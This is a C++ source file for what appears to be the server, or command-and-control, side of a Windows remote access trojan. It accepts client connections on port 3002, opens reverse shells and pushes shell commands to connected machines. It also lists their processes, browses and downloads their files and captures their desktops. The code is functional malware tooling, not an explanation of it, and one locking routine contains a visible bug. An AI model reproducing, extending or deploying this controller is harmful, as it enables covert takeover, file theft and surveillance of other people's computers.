#include "NetServerService.h"
#include "NetClientService.h"
#include "../../../shared/ConcurrentLib//core/Mutex.h"
#include "../../../shared/NetLib/packets/PacketPresentation.h"
#include "../../models/Client.h"
#include "../../../shared/NetLib/packets/PacketProcess.h"
#include "../../../shared/NetLib/packets/PacketFileSystem.h"
#include "../../../shared/NetLib/packets/PacketDownload.h"
#include "../../../shared/NetLib/packets/PacketMediaResponse.h"
#include "../../Application.h"
#include <iostream>
#include "../../../../Win32/ConcurrentLib/core/Thread.h"
#include "../../../shared/NetLib/models/errors.h"
#include "../../../shared/NetLib/packets/PacketShell.h"


// #include "../../../shared/NetLib/models/errors.h"


DWORD WINAPI listenPacketsToBeSentThreadFunc(LPVOID threadArg)
{
	auto netServerService = static_cast<NetServerService*>(threadArg);
	netServerService->loopPacketsQueue();
	return 0;
}

NetServerService::NetServerService(Application* app): application(app)
{
	// clientsMutex = new Mutex("clientsMutex");
	InitializeSRWLock(&clientsLock);
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_addr.s_addr = htonl(INADDR_ANY);
	// clientAddr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	// clientAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	serverAddress.sin_port = htons(3002);
}

NetServerService::~NetServerService()
{
	// TODO: improve this, there may be race issues
	// UUID* uuid;
	for (auto const& client : clients)
	{
		// uuid = client.second->getUuid();
		// uuidService->freeUuid(uuid);
	}
}


void NetServerService::start()
{
	running = true;
	startSendPacketsLoopAsync();
	listenForClients();
}

// Launch a thread looping trough a queue of Events coming from Application
void NetServerService::startSendPacketsLoopAsync()

{
	packetSendThread = new Thread(static_cast<LPTHREAD_START_ROUTINE>(listenPacketsToBeSentThreadFunc),
	                              static_cast<PVOID>(this));
	packetSendThread->run();
}

void NetServerService::listenForClients()
{
	application->onServerStatusChanged("[+] Creating server ...");

	if (createTCPServer(port) == INVALID_SOCKET)
	{
		application->onServerStatusChanged("Error creating TCP Server");
		return;
	}

	ADDRINFOA addrinfo;
	running = true;
	int clientAddressLength = sizeof(struct sockaddr_in);

	application->onServerStatusChanged("[+] Server socket accepting clients");

	while (running)
	{
		SOCKET clientSocket = accept(socketDescriptor, (SOCKADDR*)&addrinfo, &clientAddressLength);

		if (clientSocket == INVALID_SOCKET)
		{
			NetError error;
			getErrorOnConnect(error);
			application->onServerError(error.messageChar);

			return;
		}
		else
		{
			// boost::uuids::uuid uuid = uuidGenerator();
			// std::lock_guard<std::mutex> lock(clientsMutex);
			// clientsMutex->lock();

			//auto client = std::make_shared<NetClientService>(this, clientSocket);
			UUID* uuid = UuidService::generateUUID();
			NetClientService* client = new NetClientService(uuid, this, clientSocket);

			client->setSocketDescriptor(clientSocket);
			std::pair<SOCKET, NetClientService*> clientPair = std::make_pair(clientSocket, client);

			AcquireSRWLockExclusive(&clientsLock);
			clients.insert(clientPair);
			ReleaseSRWLockExclusive(&clientsLock);

			// clientsMutex->unlock();
			client->interactAsync();

			// TODO: Get remote Ip and send it
			application->onServerStatusChanged("[+] New connection");
		}
	}
}


SOCKET NetServerService::createTCPServer(unsigned short port)
{
	ADDRINFOA address;

	ZeroMemory(&address, sizeof(ADDRINFOA));

	address.ai_family = AF_INET;
	address.ai_socktype = SOCK_STREAM;
	address.ai_protocol = IPPROTO_IP;
	address.ai_flags = AI_PASSIVE; // msdn : The clientSocket address will be used in a call to the bind function.

	int iResult = 0;

	const SOCKET serverSocket = socket(address.ai_family, address.ai_socktype, address.ai_protocol);
	setSocketDescriptor(serverSocket);
	if (serverSocket == INVALID_SOCKET)
	{
		NetError* err = getErrorOnSocketCreate();

		application->onServerError(err->messageChar);
		delete err;
		WSACleanup();
		return 1;
	}
	int yes = 1;
	iResult = setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(int));
	if (iResult != 0)
	{
		closesocket(serverSocket);
		WSACleanup();
		return 1;
	}

	iResult = ::bind(serverSocket, (sockaddr*)&serverAddress, sizeof(SOCKADDR));

	if (iResult == SOCKET_ERROR)
	{
		NetError* err = getErrorOnBind();

		delete err;
		closesocket(serverSocket);
		WSACleanup();
		return 1;
	}

	iResult = listen(serverSocket, SOMAXCONN);
	return serverSocket;
}


/*
// std::shared_ptr<NetClientService> NetServerService::getClientByUuid(UUID* uuid)
NetClientService* NetServerService::getClientByUuid(UUID* uuid)
{
	for (std::vector<int>::size_type i = 0; i != clients.size(); i++)
	{
		// std::vector<std::shared_ptr<NetClientService>>::value_type client = clients[i];
		auto client = clients[i];
		if (client->getUuid() == uuid)
			return client;
	}

	return nullptr;
}
*/

void NetServerService::loopPacketsQueue()
{
	Packet* packet;
	SOCKET uuid;
	// std::shared_ptr<NetClientService> client;
	NetClientService* client;

	running = true;
	while (running)
	{
		std::unique_lock<std::mutex> lock(outPacketsMutex);

		if (!packetsToBeSent.empty())
		{
			packet = packetsToBeSent.front();
			uuid = packet->getDestination();
			client = clients[uuid];
			client->sendPacket(packet);
		}
		else
		{
			cv.wait(lock, [this] { return !packetsToBeSent.empty(); });
			packet = packetsToBeSent.front();
			uuid = packet->getDestination();
			client = clients[uuid];
			client->sendPacket(packet);
		}
		packetsToBeSent.pop();
	}
}

void NetServerService::sendPacketAsync(Packet* packet)
{
	std::unique_lock<std::mutex> lock(outPacketsMutex);
	packetsToBeSent.push(packet);
	cv.notify_one(); // Notify worker
}

void NetServerService::onError(NetError* appError)
{
}

std::map<SOCKET, NetClientService*> NetServerService::getClientsMap()
{
	return clients;
}

std::vector<Client*> NetServerService::getClients()
{
	AcquireSRWLockShared(&clientsLock);
	std::vector<Client*> clientsVector;
	for (auto&& clientPair : clients)
	{
		Client* client = clientPair.second->getClient();
		clientsVector.push_back(client);
	}
	ReleaseSRWLockShared(&clientsLock);
	return clientsVector;
}

std::vector<NetClientService*>::size_type NetServerService::getClientsCount()
{
	AcquireSRWLockShared(&clientsLock);
	const size_t count = clients.size();
	ReleaseSRWLockShared(&clientsLock);
	return count;
}

void NetServerService::onPacketReceived(Client* client, Packet* packet)
{
	char uuidBuffer[256];
	UuidService::getStringFromUuid(client->getUuid(), uuidBuffer);
	switch (packet->getType())
	{
	case PacketType::Presentation:
		{
			auto presentationPacket = (PacketPresentation*)packet;
			application->onClientConnected(client);
			delete packet;
			break;
		}
	case PacketType::ReverseShell:
		{
			auto packetShell = (PacketShell*)packet;

			application->onShellResult(client, packetShell->action, packetShell->data);

			delete packetShell;
			break;
		}

	case PacketType::ProcessList:
		{
			const auto packetProcess = (PacketProcess*)packet;
			auto* processes = new std::vector<Process>(packetProcess->processes);
			application->onProcessListReceived(client, processes);
			delete packet;
			break;
		}
	case PacketType::Camera: //Packet Type: chat message
		break;
	case PacketType::FileSystem:
		{
			// const auto event = new ClientAppEvent(Subject::PacketReceived, client, packet);
			const auto packetFs = (PacketFileSystem*)packet;
			if (packetFs->path.empty() || packetFs->path == L"/" || packetFs->path == L"\\")
				application->onFsRootsReceived(client, packetFs->files);
			else
				application->onFsFilesReceived(client, packetFs->path, packetFs->files);
			break;
		}
	case PacketType::Download:
		{
			PacketDownload* packetDownload = (PacketDownload*)packet;
			application->onFileDownloaded(client, packetDownload->fileBytes, packetDownload->fileSize);
			break;
		}
	case PacketType::Desktop:
		{
			PacketMediaResponse* packetMedia = (PacketMediaResponse*)packet;
			application->onDesktopImageReceived(client, packetMedia->imageBytes, packetMedia->imageSize);
			break;
		}
	default:
		std::cout << "Not handled packet type NetServerService::onPacketReceived()" << std::endl;
		break;
	}
}

void NetServerService::onClientDisconnected(Client* client)
{
	UUID* clientId = client->getUuid();
	SOCKET socketDescriptor = client->getSocketDescriptor();
	if (clients.find(socketDescriptor) != clients.end())
	{
		NetClientService* netClient = clients[socketDescriptor];
		clients.erase(socketDescriptor);
		delete netClient;
	}
	application->onClientDisconnected(client);
}

Client* NetServerService::getClient(unsigned long long clientId)
{
	NetClientService* netClient = clients[clientId];
	if (netClient == nullptr)
		return nullptr;

	return netClient->getClient();
}


void NetServerService::listFiles(Client* client, const std::wstring& path)
{
	if (client == nullptr)
		return;

	unsigned long long id = client->getId();

	AcquireSRWLockShared(&clientsLock);
	if (clients.find(client->getId()) != clients.end())
	{
		auto packet = new PacketFileSystem;

		packet->path = path;
		queuePacket(packet, id);
	}
	ReleaseSRWLockShared(&clientsLock);
}

void NetServerService::downloadFile(Client* client, const std::wstring& path)
{
	unsigned long long clientId;
	if (client == nullptr)
	{
		return;
	}
	clientId = client->getId();

	auto packet = new PacketDownload;
	packet->filePath = path;
	queuePacket(packet, clientId);
}

void NetServerService::startRemoteDesktop(Client* client)
{
	if (client == nullptr)
		return;

	unsigned long long clientId = client->getId();
	const auto packet = new PacketMediaResponse(PacketType::Desktop);
	queuePacket(packet, clientId);
}

void NetServerService::requestReverseShell(Client* client)
{
	if (client != nullptr)
	{
		AcquireSRWLockShared(&clientsLock);
		if (clients.find(client->getId()) != clients.end())
		{
			PacketShell* packet = new PacketShell();
			packet->action = PacketShellAction::Start;
			queuePacket(packet, client->getId());
		}
		ReleaseSRWLockShared(&clientsLock);
	}
}

void NetServerService::sendShellCommand(Client* client, std::string& instruction)
{
	if (client != nullptr)
	{
		AcquireSRWLockShared(&clientsLock);
		if (clients.find(client->getId()) != clients.end())
		{
			PacketShell* packet = new PacketShell();
			packet->action = PacketShellAction::PushCommand;
			if (instruction.at(instruction.size() - 1) != '\n')
				instruction.append("\n");
			packet->data = instruction;
			queuePacket(packet, client->getId());
		}
		ReleaseSRWLockShared(&clientsLock);
	}
}

void NetServerService::queuePacket(Packet* packet, unsigned long long clientId)
{
	packet->setDestination(clientId);
	std::unique_lock<std::mutex> lk(outPacketsMutex);
	packetsToBeSent.push(packet);
	cv.notify_one(); // Notify worker
}

void NetServerService::requestProcessList(Client* client)
{
	if (client != nullptr)
	{
		AcquireSRWLockShared(&clientsLock);
		if (clients.find(client->getId()) != clients.end())
		{
			PacketProcess* packet = new PacketProcess();
			queuePacket(packet, client->getId());
		}
		AcquireSRWLockShared(&clientsLock);
	}
}

NetError* NetServerService::getErrorOnBind()
{
	int errCode = WSAGetLastError();
	NetError* err = new NetError;
	err->errorCode = errCode;
	if (errCode == WSANOTINITIALISED)
		err->messageChar.append("A successful WSAStartup must occur before using this function.");
	else if (errCode == WSAENETDOWN)
		err->messageChar.append("The network subsystem has failed.");
	else if (errCode == WSAEADDRINUSE)
	{
		err->messageChar.append("A process on the machine is already bound to the same\n");
		err->messageChar.append("fully-qualified address and the socket has not been marked\n");
		err->messageChar.append("to allow address re-use with SO_REUSEADDR. For example,\n");
		err->messageChar.append("IP address and port are bound in the af_inet case");
	}
	else if (errCode == WSAEADDRNOTAVAIL)
		err->messageChar.append("The specified address is not a valid address for this machine.");
	else if (errCode == WSAEFAULT)
	{
		err->messageChar.append("The name or the namelen parameter is not a valid part of\n");
		err->messageChar.append("the user address space, the namelen parameter is too small,\n");
		err->messageChar.append("the name parameter contains incorrect address format for the\n");
		err->messageChar.append("associated address family, or the first two bytes of the memory\n");
		err->messageChar.append("block specified by name does not match the address family\n");
		err->messageChar.append("associated with the socket descriptor s.");
	}
	else if (errCode == WSAEINPROGRESS)
	{
		err->messageChar.append("A blocking Windows Sockets 1.1 call is in progress, or the\n");
		err->messageChar.append("service provider is still processing a callback function.");
	}
	else if (errCode == WSAEINVAL)
		err->messageChar.append("The socket is already bound to an address. ");
	else if (errCode == WSAENOBUFS)
		err->messageChar.append("Not enough buffers available, too many connections.");
	else if (errCode == WSAENOTSOCK)
		err->messageChar.append("The descriptor is not a socket.");
	else err->messageChar.append("unknown problems!");
	return err;
}

/*
 *
 *	/* case FileSystem:
			std::string FileName; //string to store file name
			if (!GetString(ID, FileName)) //If issue getting file name
				return false; //Failure to process packetType
	
			connections[ID]->file.infileStream.open(FileName, std::ios::binary | std::ios::ate);
			//Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
			if (!connections[ID]->file.infileStream.is_open()) //If file is not open? (Error opening file?)
			{
				std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." <<
					std::endl;
				return true;
			}
	
			connections[ID]->file.fileName = FileName;
			//set file name just so we can print it out after done transferring
			connections[ID]->file.fileSize = connections[ID]->file.infileStream.tellg(); //Get file size
			connections[ID]->file.infileStream.seekg(0);
			//Set cursor position in file back to offset 0 for when we read file
			connections[ID]->file.fileOffset = 0; //Update file offset for knowing when we hit end of file
	
			if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
				return false;
			
void NetServerService::OnClientDisconnected(boost::uuids::uuid uuid)
{
	std::lock_guard<std::mutex> lock(clientsMutex);
	clients[uuid]->packetDispatcher.Clear();
	clients[uuid]->CloseAllConnections();
	closesocket(clients[uuid]->clientSocket);
}
*/
